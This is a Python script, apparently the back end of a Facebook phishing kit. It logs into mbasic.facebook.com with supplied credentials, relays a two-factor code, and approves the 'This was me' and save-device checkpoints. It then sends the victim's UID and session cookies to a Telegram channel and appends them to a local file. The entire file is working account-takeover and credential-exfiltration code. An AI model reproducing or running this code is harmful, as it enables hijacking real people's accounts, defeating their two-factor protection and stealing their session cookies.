import requests
import threading
import os
from facebook_api import tele
from time import sleep
def save_to_txt(content):
	path = os.path.dirname(__file__)[0:len(os.path.dirname(__file__))-len('facebook_api')]
	f = open(path+'data.txt','a+',encoding='utf-8')
	f.write(content+"\n======================\n")

proxies = {}
headers = {
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	'Accept-Language':'en-US,en;q=0.9',
	'Cache-Control':'max-age=0',
	'Content-Type':'application/x-www-form-urlencoded',
	'Dpr':'1',
	'Origin':'https://mbasic.facebook.com',
	'Referer':'https://mbasic.facebook.com/',
	'Sec-Ch-Prefers-Color-Scheme':'light',
	'Sec-Ch-Ua':'"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
	'Sec-Ch-Ua-Full-Version-List':'"Google Chrome";v="117.0.5938.152", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.152"',
	'Sec-Ch-Ua-Mobile':'?0',
	'Sec-Ch-Ua-Model':'""',
	'Sec-Ch-Ua-Platform':'"Windows"',
	'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
	'Sec-Fetch-Dest':'document',
	'Sec-Fetch-Mode':'navigate',
	'Sec-Fetch-Site':'same-origin',
	'Sec-Fetch-User':'?1',
	'Upgrade-Insecure-Requests':'1',
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
	'Viewport-Width':'1160'
}
def cut_string(string,start,end):
	try:
		return string.split(start)[1].split(end)[0]
	except:
		return ""
def convert_cookies_to_string(cookies):
	cookies_string = ''
	for key in cookies:
		cookies_string += key+'='+cookies[key]+';'
	return cookies_string
def login_fb(username,password):
	while True:
		try:
			url = 'https://mbasic.facebook.com'
			session = requests.Session()
			p = session.get(url,proxies=proxies,headers=headers)
			response = p.text
			lsd = cut_string(response,'name="lsd" value="','"')
			jazoest = cut_string(response,'name="jazoest" value="','"')
			m_ts = cut_string(response,'name="m_ts" value="','"')
			li = cut_string(response,'name="li" value="','"')
			try_number = '0'
			unrecognized_tries = '0'
			bi_xrwh = '0'
			data = {
				'lsd': lsd,
				'jazoest': jazoest,
				'm_ts': m_ts,
				'li': li,
				'try_number': try_number,
				'unrecognized_tries': unrecognized_tries,
				'email': username,
				'pass': password,
				'bi_xrwh': bi_xrwh
			}
			url = 'https://mbasic.facebook.com/login/device-based/regular/login'
			p = session.post(url,data=data,headers=headers,proxies=proxies)
			cookies = convert_cookies_to_string(session.cookies.get_dict())

			if 'c_user' in cookies:
				message = 'success_live'
			elif 'checkpoint' in cookies:
				if 'name="approvals_code"' in p.text:
					message = '2fa'
				else:
					message = 'success_die'
			else:
				message = 'fail'
			return message,cookies
		except Exception as e:
			print(e)

def login_fb_2fa(username,password,two_fa,info):
	while True:
		try:
			url = 'https://mbasic.facebook.com'
			session = requests.Session()
			p = session.get(url,proxies=proxies)
			response = p.text
			lsd = cut_string(response,'name="lsd" value="','"')
			jazoest = cut_string(response,'name="jazoest" value="','"')
			m_ts = cut_string(response,'name="m_ts" value="','"')
			li = cut_string(response,'name="li" value="','"')
			try_number = '0'
			unrecognized_tries = '0'
			bi_xrwh = '0'
			data = {
				'lsd': lsd,
				'jazoest': jazoest,
				'm_ts': m_ts,
				'li': li,
				'try_number': try_number,
				'unrecognized_tries': unrecognized_tries,
				'email': username,
				'pass': password,
				'bi_xrwh': bi_xrwh
			}
			url = 'https://mbasic.facebook.com/login/device-based/regular/login'
			p = session.post(url,data=data,headers=headers,proxies=proxies)
			# 2fa
			response = p.text
			fb_dtsg = cut_string(response,'name="fb_dtsg" value="','"')
			jazoest = cut_string(response,'name="jazoest" value="','"')
			checkpoint_data = ''
			approvals_code = two_fa
			codes_submitted = '0'
			submit_submit_code = 'Submit Code'
			nh = cut_string(response,'name="nh" value="','"')
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'checkpoint_data': checkpoint_data,
				'approvals_code': approvals_code,
				'codes_submitted': codes_submitted,
				'submit[Submit Code]': submit_submit_code,
				'nh': nh,
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest
			}

			url = 'https://mbasic.facebook.com/login/checkpoint/'
			p = session.post(url,data,headers=headers,proxies=proxies)
			if 'name="approvals_code"' in p.text:
				message = 'fail'
				cookies = convert_cookies_to_string(session.cookies.get_dict())
				return message,cookies
			else:
				t = threading.Thread(target=thread_verify_login,args=(url,p,session,info,proxies,))
				t.start()
				return "success","success"
		except Exception as e:
			print(e)
def thread_verify_login(url,p,session,info,proxies):
	_url = url
	_p = p
	_session = session
	_info = info
	while True:
		try:
			url = _url
			p = _p
			session = _session
			info = _info
			# proxies = get_proxy_302('sg')

			response = p.text
			fb_dtsg = cut_string(response,'name="fb_dtsg" value="','"')
			jazoest = cut_string(response,'name="jazoest" value="','"')
			checkpoint_data = ''
			name_action_selected = 'save_device'
			submit_continue = 'Continue'
			nh = cut_string(response,'name="nh" value="','"')
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'checkpoint_data': checkpoint_data,
				'name_action_selected': name_action_selected,
				'submit[Continue]': submit_continue,
				'nh': nh,
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest
			}

			p = session.post(url,data=data,headers=headers,proxies=proxies)

			# review login
			response = p.text
			fb_dtsg = cut_string(response,'name="fb_dtsg" value="','"')
			jazoest = cut_string(response,'name="jazoest" value="','"')
			checkpoint_data = ''
			submit_continue = 'Continue'
			nh = cut_string(response,'name="nh" value="','"')
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'checkpoint_data': checkpoint_data,
				'submit[Continue]': submit_continue,
				'nh': nh,
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest
			}
			url = 'https://mbasic.facebook.com/checkpoint'
			p = session.post(url,data=data,headers=headers,proxies=proxies)

			# this was me
			response = p.text
			fb_dtsg = cut_string(response,'name="fb_dtsg" value="','"')
			jazoest = cut_string(response,'name="jazoest" value="','"')
			checkpoint_data = ''
			submit_this_was_me = 'This was me'
			nh = cut_string(response,'name="nh" value="','"')
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'checkpoint_data': checkpoint_data,
				'submit[This was me]': submit_this_was_me,
				'nh': nh,
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest
			}
			p = session.post(url,data=data,headers=headers,proxies=proxies)

			#save device
			response = p.text
			fb_dtsg = cut_string(response,'name="fb_dtsg" value="','"')
			jazoest = cut_string(response,'name="jazoest" value="','"')
			checkpoint_data = ''
			name_action_selected = 'save_device'
			submit_continue = 'Continue'
			nh = cut_string(response,'name="nh" value="','"')
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'checkpoint_data': checkpoint_data,
				'name_action_selected': name_action_selected,
				'submit[Continue]': submit_continue,
				'nh': nh,
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest
			}
			p = session.post(url,data=data,headers=headers,proxies=proxies)
			cookies = convert_cookies_to_string(session.cookies.get_dict())
			uid = cut_string(cookies,'c_user=',';')
			info = info+'UID: <code>'+uid+'</code>\n'+'Cookie: <code>'+cookies+'</code>'
			tele.send_message(info)
			save_to_txt(info)
			break
		except Exception as e:
			print(e)
